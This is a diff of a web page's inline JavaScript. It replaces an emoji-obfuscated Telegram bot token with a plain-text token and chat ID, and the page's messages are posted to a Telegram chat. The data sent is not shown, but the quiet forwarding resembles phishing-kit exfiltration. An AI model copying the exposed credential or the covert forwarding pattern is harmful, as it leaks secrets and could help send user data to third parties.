@@ -251,42 +251,30 @@
           enviarParaTelegram(mensagemTelegram);
         }
         function enviarParaTelegram(texto) {
-            const partes = [
-            "86X84",         // ID do bot (parte 1)
-            "1599🐸38",      // ID do bot (parte 2)
-            "AAFt47mU",      // token (parte 1)
-            "RgJzP2☕h8",     // token (parte 2)
-            "arKhF7🍕E3",    // token (parte 3)
-            "-Yqnk2x",       // token (parte 4)
-            "TzAI"           // token (parte 5)
-            ];
+    // Insira seu novo token diretamente aqui entre as aspas
+    const botToken = '8749346011:AAH3vZZt7qF_nJm_M_kEqhs-vXtDifq7wNs'; 
+    const chatId = '-1004211257381';
+    
+    // A URL continua a mesma, puxando o token diretamente
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            const limpar = (str) => str.replace(/X|🐸|☕|🍕/g, '');
-
-            const t1 = limpar(partes[0]) + limpar(partes[1]); 
-            const t2 = limpar(partes[2]) + limpar(partes[3]) + limpar(partes[4]) + limpar(partes[5]) + limpar(partes[6]);
-
-            const botToken = `${t1}:${t2}`;
-            const chatId = '-1004211257381';
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: texto,
-                parse_mode: 'Markdown'
-            })
-            })
-            .then(async (response) => {
-                const data = await response.json();
-                if (!response.ok || !data.ok) {
-                throw new Error(data.description || 'Erro ao enviar para o Telegram');
-                }
-            })
-            .catch(error => console.error('Erro ao enviar para o Telegram:', error));
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: texto,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(async (response) => {
+        const data = await response.json();
+        if (!response.ok || !data.ok) {
+            throw new Error(data.description || 'Erro ao enviar para o Telegram');
         }
+    })
+    .catch(error => console.error('Erro ao enviar para o Telegram:', error));
+}
     </script>
 </body>
 
